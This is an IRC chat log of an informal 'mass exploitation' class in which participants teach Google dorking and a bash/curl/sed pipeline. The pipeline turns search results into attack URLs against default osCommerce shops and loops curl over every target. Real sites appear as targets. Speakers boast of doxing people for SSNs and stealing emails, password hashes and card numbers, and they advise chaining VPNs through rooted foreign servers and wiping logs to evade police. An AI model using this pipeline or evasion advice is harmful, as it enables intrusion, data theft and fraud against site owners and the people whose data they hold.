Mass Exploitation (by xochipilli, and Savitri)

<Fox> Ok
<Fox> Impromptu class
<Savitri> on “leveraging bash to mass exploit”
<Fox> I’m at a beach right now
<Fox> Literally
<Fox> on the sand.
<Fox> And we’re about to have a motherfucking class.
<prophet> haha ballin
<Shock> are there rj45′s in the sand to connect to?
<Shock> 
<yngjungian> nice
<Fox> Nope but there is an iphone and bluetooth and 3g.
<Shock> lul
<xochipilli> thxu Fox
* Fox gives channel operator status to Fox
<Fox> Hmm
<In4TehLulz> log this. wont be here
<Fox> Savitri eax  xochipilli what you think about mass exploitation?
<prophet> Ill log
<Fox> How you all think?
<Fox> Hmm
<Fox> CLASS!?
<xochipilli> haha
<xochipilli> its good if u got good sploitz
<xochipilli> lol
<Savitri> Fox: I’m for it, when it comes to google
<Savitri> or mining resources in SupCom
<xochipilli> otherwise
<xochipilli> youll get sloppy seconds
<xochipilli> on a bunch of shit thats been owned a dozen times before
<Savitri> I’m doing that exactly right now
<Fox> Sloppy seconds are better than NOTHING.
<xochipilli> if u got something fresh
<xochipilli> good dorks, or a new exploit
<xochipilli> is gud
<xochipilli> well true
<xochipilli> depends what youre doin
<Fox> :3
<Savitri> writing bash/curl code to search for a particular exploit
<Savitri> scrapping Google
<f3ckt4rd> autopwn?
<xochipilli> dorkin
<Savitri> (scroogle tbh)
<xochipilli> i have some perl to do that somewhere Savitri
* Baconboy has quit (Quit: )
* In4TehLulz has quit (Quit: )
<_0xE9> santrex
<_0xE9> LOL
<Fox> Werd
<Savitri> well, bash, sed, curl, grep, that’s about it
<Savitri> derp
<Savitri> Site attempt: http://www.customcrops.com//admin/backup.php/login.php?action=backup
<Savitri> Site attempt: http://www.dharma.net/monstore//admin/backup.php/login.php?action=backup

<Savitri> such things
<xochipilli> yeah
<xochipilli> i dig it
<xochipilli> now u jus need some code to attack those urls

<Vey> not so fast pls 
<Fox> _0xE9
<Fox> Cheap and cardedddddd
<Fox> 
<_0xE9> lol
<Fox> Laright
<Fox> alright
<Fox> hold up
<Savitri> so, basically, the idea is 10% or so of websites makers are MORONS
<_0xE9> santrax is like worst shit ever lol
<Savitri> and will keep the default layout, and such
<Fox> STOP.
<Fox> lol
<_0xE9> santrex*
<Fox> Stop.
<Fox> stop.
<Savitri> let’s +m
* Savitri sets mode +m #school4lulz
<Fox> Ok.
<Fox> Kids
* _Mash_ (Mash@EDJOOKASHUNYAY-67F2B62C.customers.ownit.se) has joined #school4lulz
<Fox> as always, message someone not talking for voice.
<Fox> If you are going to say something
<Fox> if it’s dumb, I will fistfuck you.
* xochipilli takes out his penis
<Fox> Now todays topic
<Fox> is mass exploitation.
<Fox> Anyways
* Mash has quit (NickServ (GHOST command used by _Mash_))
<Fox> You dont ever
* _Mash_ is now known as Mash
<Fox> EVER want to go and compromise every box you have in your aresenal
<Fox> and naturally
<Fox> hackers are lazy people.
* Savitri gives voice to _0xE9
<Fox> We like to roller blade
<xochipilli> LOL
<Fox> and do all sorts of drugs
* Savitri_ (savitri@BE32C070.23C45F78.E87C2A3A.IP) has joined #school4lulz
* fitk has quit (Connection reset by peer)
<Fox> and read the devil book
<Fox> obviously.
<Fox> So, we automate.
<Fox> Today your teachers will be xochipilli, Savitri, and myself.
<Fox> Now, the purpose of this class
<Fox> is to give you the mindset, and necessary knowledge in order to take an exploit that you have either developed, or has been released with a large AoE
<Fox> or area of effect.
<Fox> Regardless of what anyone says about using other peoples exploits, exploitation is exploitation, root is root, power is power. Don’t be a faggot and always use pre-made though
<Fox> It’s kind of like food.
<Fox> Yeah, premade hashbrowns and microwave bacon are easy
<xochipilli> mass exploitation makes sure u have time for roller blades and drugs :3
<Savitri> so we won’t want to manually search for stupid exploits in sites
<Savitri> basically, what I like to do is identify a vulnerable pattern, like the yelled at “page=about.php”
* Savitri has quit (Quit: Reconnecting)
<Fox> but if you can’t make your own breakfast, you’re a sad fuck.
* Savitri_ is now known as Savitri
<Fox> Savitri, take it away
* Savitri (savitri@BE32C070.23C45F78.E87C2A3A.IP) has left #school4lulz

<Savitri> k
<Savitri> sorry, network outage
<Savitri> so you got my last message?
<Savitri> Fox, you wanted to lemme talk?
<xochipilli> well we started to talk about dorking, should we start w/ that?
<Fox> Yes.
<Fox> remember guys… basic to advanced.
<xochipilli> so basically, if you’ve got a web based exploit
<Fox> 
<Fox> IE: RFI, SQLi, et cetera
<xochipilli> how would u best deploy this, on a broad scale?
<xochipilli> esp considering
<xochipilli> were you to port scan for port 80
<xochipilli> you have chosts to worry about
<xochipilli> vhosts*
<xochipilli> makes that pretty much useless
<xochipilli> considering most stuff is hosting on shared hosting using vhosts
<Savitri> well, you do scrap Google
<xochipilli> whyu not another search engine?
<xochipilli> 
<Savitri> ’cause Google has scroogle
* ponies (chatzilla@EDJOOKASHUNYAY-949EB453.privacyfoundation.de) has joined #school4lulz
* ponies (chatzilla@EDJOOKASHUNYAY-949EB453.privacyfoundation.de) has left #school4lulz
<Savitri> which is like parse-me-in-a-line.com
<xochipilli> i didnt realize that was still up
* ponies (chatzilla@EDJOOKASHUNYAY-949EB453.privacyfoundation.de) has joined #school4lulz
<xochipilli> there are decent libraries
<xochipilli> for scarping google
<xochipilli> scrpaing*
<Savitri> scrapping
<xochipilli> scraping**
<xochipilli> its hard, but it can be done
<xochipilli> so, its easy to scrape w/ scroogle
<xochipilli> and
<xochipilli> google provides some really nice functionality
<xochipilli> for fine tuning your searches
<xochipilli> and, its the biggest/best
<xochipilli> youll get the most comprehensive results from google
<xochipilli> most likely
<Savitri> yup, plus you can specify interesting parameters, like inurl
* fitk (fitk@152183DB.A1FCF178.30A70C0.IP) has joined #school4lulz
<Savitri> suppose you target new zealand based websites for some purpose
<xochipilli> yeah
<Savitri> (harvesting data for spam, like)
<Savitri> allinurl:.com.nz yourdorking
<xochipilli> or filetype:php
<Savitri> this gives a pretty decent and simple action
<xochipilli> if youre looking for a sploit specific to php
<Savitri> one thing that’s missing is regex
<xochipilli> or even if youre lookin for some interesting documents, filetype:pdf
<xochipilli> youd be amazed what you can find on public html servers
<xochipilli> if u dig around
<Savitri> but you can scrap massively, and then do regexp
<xochipilli> tax returns w/ full SSN
<xochipilli> etc
<Savitri> yeah, I doxed many US people like this
<xochipilli> never underestimate how fucking stupid people are
<Savitri> got their SSN, name, address
<Fox> Alright guys
* Blue (Blue@EDJOOKASHUNYAY-4E876EF8.rstr.qwest.net) has joined #school4lulz

<Fox> Alright cool
<Fox> brb
<Fox> more rum
<Fox> walking up to the house
* Blue has quit (Quit: Leaving)
<Savitri> ok
<Savitri> so people
<Savitri> for that kind of tasts
<Savitri> task
<Savitri> you want an Unix
<Savitri> Linux prolly
<Savitri> ok
<Savitri> the channel is +m so you won’t answer much :p
* Savitri gives voice to _0xE9
<Savitri> tools, tools
* zoon (root@EDJOOKASHUNYAY-F9882A47.torservers.net) has joined #school4lulz
<Savitri> check scroogle for your beginning
<Savitri> scroogle allows you to scrape like 250/300 results
<xochipilli> o gud
<Savitri> so, for this, you’ll need curl, bash, and minimal knowledge of regex
<xochipilli> we’re back
<Savitri> yes we are
<xochipilli> what was i sayin?
<Savitri> dunno
<Savitri> i got ddos
<Savitri> can’t tell you
<xochipilli> neither do i
<xochipilli> nah
<xochipilli> i got dropped too
<Savitri> that’s becuase you’re drunk
<xochipilli> it wasnt ddos
<xochipilli> am not
<Savitri> ok
<xochipilli> my memory is permanantly bad
<Savitri> that’s because you’re with low memory
<Savitri> you’re swapping
<xochipilli> am
<xochipilli> lol
<xochipilli> <3
<Savitri> :3
<xochipilli> so yeah
<xochipilli> is that dork
<xochipilli> u showed earlier
<Savitri> so yeah ,bash, curl, grep, sed
<xochipilli> an lfi?
<xochipilli> was the last thing i said
<Savitri> no, it’s a backup rape technique
<Savitri> to get databases
<Savitri> i did that so I could get aussie e-mail addresses
<Savitri> and password hashes hopefully
<Savitri> and CCN
<Savitri> and all I could
<Savitri> wasn’t so succesful because the exploit I used is not so common nowadays
<Savitri> it’s present in OSC 2.2rc2
<xochipilli> ah
<Savitri> PROTIP: dorking isn’t an exploit. dorking will give you targets but you still have to shoot
<xochipilli> ^
<xochipilli> so
<xochipilli> what would
<xochipilli> an exploit look like
<xochipilli> for that vuln you mentioned?
<xochipilli> the url
<xochipilli> so we can see it next to the dork?
<Savitri> mm, it’s based on some PHP script_name weakness
<Savitri> the idea is to make osc think we’re on login page while we aren’t
<Savitri> it’s in OSC’s backoffice so it won’t be indexed
<xochipilli> hmm we should use a simpler exploit
<xochipilli> to explain this
<xochipilli> it can be fictional
<xochipilli> idc
<Savitri> it’s really the simplest
<xochipilli> ah
<Savitri> lemme proceed 
<xochipilli> ok
<Savitri> so, first target, default OSC installs, which will have the admin folder as /admin
* xi (reza@F03BB204.144DEF32.8187144B.IP) has joined #school4lulz
<Savitri> and the shop not url rewritten
<Savitri> a typical url will contain cPath (category path)
<Savitri> so what do we do?
<Savitri> inallurl:index.php?cPath
<Savitri> will be fair enough
<Savitri> do it manually, come on, go Google
<Savitri> s/inallurl/allinurl/g
<xochipilli> i think jus inurl:
<xochipilli> works
<xochipilli> i could be wrong
<Savitri> google will yell at you cause you’re a nasty exploiter
<_0xE9> What’s difference?
<Savitri> works too
* Fox has quit (Ping timeout)
<Savitri> Google to find the difference
<Savitri> as a matter of habit I use allinurl
<Savitri> so, we find default systems
<Savitri> even _more_ defautl systems is with /catalog as the shop address
<Savitri> so
<Savitri> allinurl:”index.php?cPath” inurl:”/catalog”
<Savitri> we get a list of addresses
<Savitri> let’s automate this now
<Savitri> scroogle’s your friend, really
* In4TehLulz (In4TehLulz@F1274BD2.55401656.EFE09413.IP) has joined #school4lulz
<Savitri> curl http://www.scroogle.org/cgi-bin/nbbw.cgi -d “Gw=allinurl:%22index.php?cPath%22%20inurl:%22/catalog%22&n=1″
<Savitri> check this shit out, see what it’s like
* i0dic (AndChat@EDJOOKASHUNYAY-EC718E11.torservers.net) has joined #school4lulz
<Savitri> you will see 100 lines numbered
<Savitri> with curl http://www.scroogle.org/cgi-bin/nbbw.cgi -d “Gw=allinurl:%22index.php?cPath%22%20inurl:%22/catalog%22&n=1″
<Savitri> so you want to grep these 100 numbered lines
<Savitri> pretty simple, they start with numbers
<Savitri> with curl http://www.scroogle.org/cgi-bin/nbbw.cgi -d “Gw=allinurl:%22index.php?cPath%22%20inurl:%22/catalog%22&n=1″ | grep ^[0-9]
<Savitri> note that i’d, for scraping, first output to a “buffer” file
<Savitri> so
<Savitri> with curl http://www.scroogle.org/cgi-bin/nbbw.cgi -d “Gw=allinurl:%22index.php?cPath%22%20inurl:%22/catalog%22&n=1″ > mybuf
<Savitri> cat mybuf | grep ^[0-9]
<Savitri> this would allow problems like… mmm… getting banned for hammering
<Savitri> ok, now we get things like
<Savitri> 98. <a href=”http://www.switchvox.com/catalog/index.php?cPath=22″>Subscriptions / Maintenance – Switchvox</a>
<Savitri> 99. <a href=”http://www.texasboars.com/catalog/index.php?cPath=21″>TEXASBOARS</a>
<Savitri> there comes the magic of cut
<Savitri> tool for lazy people fosha
<Savitri> cat buf | grep ^[0-9] | cut -d\” -f2
<Savitri> and there, you get
<Savitri> http://www.switchvox.com/catalog/index.php?cPath=22
<Savitri> http://www.texasboars.com/catalog/index.php?cPath=21
<Savitri> this will get yo ufar
<Savitri> but this ain’t the exploit URL
<xochipilli> basically u just found a big list
<Savitri> so we transform again.
<xochipilli> of potentially vulnerable sites
<xochipilli> attack vectors
<Savitri> Yup
<Savitri> now ‘ill test ‘em
<xochipilli> now u gotta attack them
<Savitri> for my attack vector
<xochipilli> u can do this automatically
<Savitri> yup
<xochipilli> usually
<xochipilli> if youre clever
<Savitri> noway I’ll edit a file by hand
<Savitri> yes
<Savitri> here, it’s purely GET based
<xochipilli> curl -d
<xochipilli> lets u send post params
<Savitri> yup
<xochipilli> curl = good tool
<Savitri> but here we won’t need it
<xochipilli> everyone install curl
<xochipilli> ifu havent already
<xochipilli> if youre doin any kind of web exploitation
<xochipilli> you NEED CURL
<Savitri> that’s your swiss army knife
<Savitri> so, let’s finish on that example
<Savitri> REGEX
<Savitri> you need to know that
<Savitri> if you don’t, you’re useless as an exploiter
<Savitri> cat buf | grep ^[0-9] | cut -d\” -f2 gives us plain URLs. Let’s change them
* hitler (jimmy@AAA3E89C.651411DE.4FBF9C32.IP) has joined #school4lulz
<Savitri> we assume that these default installs will have admin folder named “admin”
<Savitri> we won’ engage in bruteforce to find it, though we could
<Savitri> cat buf | grep ^[0-9] | cut -d\” -f2 | sed ‘s@index.php.*@admin/backup.php/login.php?action=backup@g’
<Savitri> OMG
<Savitri> 100 url to exploits
<Savitri> you redirect that to a file fosha
<Savitri> and now, fun
<Savitri> you’ll curl all these urls
<Savitri> I assume you called your file atklist
<Savitri> so you do
<xochipilli> thats rly all there is to it
<xochipilli> at least for dorking/web exploits
<Savitri> > log; cat atklist | while read line; do echo -n “.”; echo “Attempting attack on $line” >> log; curl $line > buf; cat buf >> log; echo “Done for $line” >> log; done
<xochipilli> dammit whered fox run off too
<Savitri> there’s not much to know
<Savitri> more than that
<Savitri> well, sometimes it’s more subtle
<Savitri> like some vbulleting sqli exploits
<Savitri> but dorking can ease your life
<Savitri> next step is writing a dorking automation script
<Savitri> that you’ll configure
<Savitri> and let work for you
<xochipilli> :3
<xochipilli> i mean you can take
<xochipilli> the bash
<Savitri> you can grep for strings to identify if there was success
<xochipilli> Savitri
<xochipilli> has been showin u guys
<xochipilli> adapt that into a simple script
<Savitri> variant of this exploit
<Savitri> have fun
<Savitri> http://www.mixmasters.com.au/catalog/admin/file_manager.php/login.php
<Savitri> I guess we can now go to questions
<Savitri> ok xochipilli?
<Savitri> (-m?)
<Savitri> xochipilli: Fox is gone for binge drinking
<Savitri> there’s rum at his palce
<Savitri> place
* Savitri sets mode -m #school4lulz
<Savitri> k guise u may speak
<FlyingDildo> Question: say you found a BoF in a piece of web facing software. wat do?
<prophet> that particular vector has an LFI vulnerability?
<xochipilli> nah
<xochipilli> i just used that as an example of a web based exploit
<xochipilli> that one might dork for
<Savitri> the variant I showed has a LFI vuln, yes
<Savitri> though it won’t be 100% reliable
<xochipilli> FlyingDildo: you could use the procedure he described
<Savitri> depends on many parameters
<xochipilli> the difference would be
<Savitri> who he?
<xochipilli> in the exploitation step
<Savitri> <- she
<f3ckt4rd> does the above example tie into tge sqlmap proxess?
<xochipilli> she
<xochipilli> sry
<xochipilli> :3
* Savitri exploits xochipilli
<Savitri> lemme show everybody your cam§
<xochipilli> f3ckt4rd: if its a sql injection, you could yes
<FlyingDildo> do post his cam.
<FlyingDildo> lulz.
<Savitri> ah, yeah, sql i
<f3ckt4rd> what was the above?
<Savitri> we could have covered this
<Savitri> but that’s another topic of mass exploiting
<i0dic> Cover it now
<_0xE9> ^
<Savitri> you can have any number of rows in a select
<Savitri> you don’t necessarily want to test all that by hand
<_0xE9> I need to refresh my SQLI skills
<Savitri> when messing with your Union
<f3ckt4rd> what do you guys make of metasploit autopen?
<Savitri> so when you’ve found a vuln in a SQLi
<Savitri> I didn’t take time to dig into it
<Savitri> I’
<Savitri> I’m sorta “traditional” and nostalgic
<Savitri> i like to use tools I know
<Savitri> I don’t like to use J. Random Hacker’s exploits
<xochipilli> you cant necessarily have any number of rows in a union select
<Savitri> xochipilli: I mean cols
<xochipilli> it has to return the same # as the original query
<xochipilli> o
<xochipilli> ok
<f3ckt4rd> is sqlmap defacto?
<Savitri> you can have a very variable number of cols
<xochipilli> yeah
<Savitri> so if you are to try to find that number
<Savitri> automate it
<xochipilli> wel wait no, doesnt it have to match the orig query?
<Savitri> with string generation algs
<xochipilli> cant return more cols than the query
<xochipilli> till shit brix
<Savitri> yup xochipilli
<Savitri> that’s why
<xochipilli> itll*
<xochipilli> kk
<xochipilli> jus clarifyin
<Savitri> we automate that
<xochipilli> oh yeah
<Savitri> using bash, or perl, or ruby
<xochipilli> fairly simple
<Savitri> ’cause we’re lazy
<Savitri> see, oscommerce for example
<xochipilli> is sqlmap totally blind? or does it support union?
<Savitri> can have like 40 rows selected
<xochipilli> i havent played w/ it much
<Savitri> sqlmap= ?
<Savitri> I know the development technique using xml sql maps
<Savitri> but no tools
<f3ckt4rd> what do you use
<Savitri> ok, http://sqlmap.sourceforge.net/
<Savitri> my brain, and my computer, basically
<FlyingDildo> for gentoo: emerge sqlmap
<Savitri> (curl, wget, lynx, scratch hea)
<Savitri> d)
<Savitri> (and ruby)
<Savitri> I mean, if you guys are to learn for real
<Savitri> you just can’t get all pre-baked recipe
<Savitri> s
<Savitri> and apply them
<f3ckt4rd> is tor enough or is there anything better
<Savitri> you’re not LOIC whores.
<Savitri> VPN, VPN
<Savitri> i urge you to read my tut
<Savitri> posted on twitter
<f3ckt4rd> where from?
<xochipilli> tor is slow
<Savitri> twitter.com/SavitriVonH4x
<xochipilli> and if youre scraping google directly
<xochipilli> it will cause issues
<xochipilli> setup a proxy if possible
<xochipilli> imo
<xochipilli> root smth, kill the logs, setup proxy
<Savitri> tor is slow, tor is owned by NSA, tor is good for evading IRC bans, not for exploiting websites
<xochipilli> chain them if youre really noid
<Savitri> a daisy chain of VPN and rooted
<Savitri> is fair enough
<xochipilli> iono about the NSA part 
<xochipilli> but the rest yeah
<f3ckt4rd> who for vpn
<FlyingDildo> scraping will always cause issues. wat do with captchas?
<xochipilli> throttle
<Savitri> whoever you can put your trust in
<Savitri> swissvpn?
<xochipilli> there are good libraries out there to scrape google
<xochipilli> if u dig around
<Savitri> I wrote one for php
<xochipilli> Savitri: hann loved them heh…
* EFG (Fagington@D9BA6BA7.5E512502.C8320787.IP) has joined #school4lulz
<xochipilli> sup EFG
<EFG> nm u
<xochipilli> so yeah, proxy > tor
<xochipilli> in this case
<xochipilli> answerin questions
<xochipilli> shhh
<xochipilli> 
<xochipilli> or vpn
<xochipilli> or whatever
<prophet> whats stops law enforcement from requesting the vpn logs to find you
<xochipilli> hosted in a diff country
<Savitri> the non-existence of logs
<Savitri> or the difference of country
<Savitri> play with jurisdictions 
<prophet> are all vpns non-logged?
<xochipilli> doin shit in another country makes a world of difference
<Savitri> In4TehLulz had the idea
<xochipilli> believe it or not
<FlyingDildo> basically usa->china->russia.
<xochipilli> in terms of LE
<xochipilli> it makes their life SUPER hard
<Savitri> root a chinese box
<Savitri> get a russian VPN
<xochipilli> ^
<Savitri> chain it to a US proxy
<Savitri> :p
<EFG> i have a serbian VPN
<prophet> haha I like that idea
<EFG> safe enough?
<FlyingDildo> and good luck to LE getting the logs from a chinese server.
<f3ckt4rd> Where can i buy a botnet
<Savitri> yeah EFG, ruined country
<xochipilli> and if its a root
<xochipilli> u kill those logs
<xochipilli> hard
<Savitri> but it may be owned by the CIA thoug
<xochipilli> run a log cleaner
<xochipilli> rootkit it if u want, im not a fan of kits tho
<xochipilli> just breaks shit, and then people notice
<prophet> suggestion of a log cleaner?
<FlyingDildo> shred
<In4TehLulz> So who logged the channel? I needs to see.
<xochipilli> ive got one, iono if its priv8 or wat
<Savitri> I have logs In4TehLulz
<In4TehLulz> the class I mean.
<xochipilli> ill see if its ok to release it to u guys
<prophet> i know the typical places logs could be
<prophet> but never can be too sure
<xochipilli> you know
<In4TehLulz> great. pastebin?
<xochipilli> we could do a talk on cleanin logs
<Savitri> not poss for now
<prophet> would be better to automate with something like that
<xochipilli> etc
<xochipilli> what do u think, Savitri?
<xochipilli> how to cover your tracks

<Savitri> xochipilli: yup, as long as it leaves the usual garbage
<xochipilli> ofc
<xochipilli> any good one would
<xochipilli> cant just rm the logs

<xochipilli> hey nachash
<i0dic> Wattup nachash
<Savitri> stalllman is for owning everything himself and not delegating anything to a system he does not control
<Savitri> he’s not an anarchist
<nachash> I’ve been f5ing the twitter account every few hours to see when the new irc was coming up
<Savitri> he’s an hermit
<FlyingDildo> http://dis.4chan.org/read/prog/1308669063/1-40 lolling.
<nachash> Stallman also allegedly smells like cat urine.
<Savitri> I’m an anarchist but I know I can’t do everything on my own
<Savitri> I can’t do anything on my own
<Savitri> nachash: _true_
<FlyingDildo> Savitri: anarchist? so edgy.
<FlyingDildo> Sure is teenage angst in here.
<Savitri> FlyingDildo: I’m inbetween national-communist and anarchist, yeah
<In4TehLulz> *sigh* Boring assignment calls… can’t really blame the teacher… it’s been due for a week now…
<FlyingDildo> I’m for anarcho capitalism. I’ve got the bigger gun so i win.
<In4TehLulz> Savitri, you support BJP… wtf you thinkin?
<Savitri> In4TehLulz: Identity is getting taken over by globalization
<Savitri> Nationalism is exactly trying to preserve one people’s roots against the acculturation and uprooting you can see in my country
<Savitri> and, even more in Asia. See Japan.
<In4TehLulz> But wouldn’ that mean that you are against globalization?

<FlyingDildo> Nice language we’re having this discussion in. What if we share no logical set of premises?
<Savitri> I am. It causes a lot of disbalances, and is the logical continuation of colonization by the western powers, excepted the lash has gone from Europe to the US.
* derail has quit (Quit: )
<In4TehLulz> Is it not possible to keep one’s roots while getting accustomed to other different things? I mean it is the height of being ignorant when an Indian says “American’s have no culutre”.
<Savitri> well, Ramdev is a bit… narrow-minded, yeah.
<Savitri> but he’s a caricature
<In4TehLulz> I believe that we will never progress from the stage of being a “Third world country” unless we learn to properly adapt to globalization.
<FlyingDildo> I take your metaphysical bullshit, and troll both of you with formal logic.
<Savitri> become Uncle Sam’s dog, you’ll get bones.
<In4TehLulz> Ramdev is stupid.
<Savitri> He’s far from stupid, he wouldn’t have gone that high otherwise.
<Savitri> Same for Sathya Sai Baba, even if I couldn’t stand him, he was a clever man
<In4TehLulz> the one who recently died in April?
<Savitri> You know, a country can grow powerful without mimicking that badly the US.
<Savitri> yup, that very one

<Savitri> well
<Savitri> that’s a bit off topic 
<In4TehLulz> ttrue
<In4TehLulz> talking about globalization…
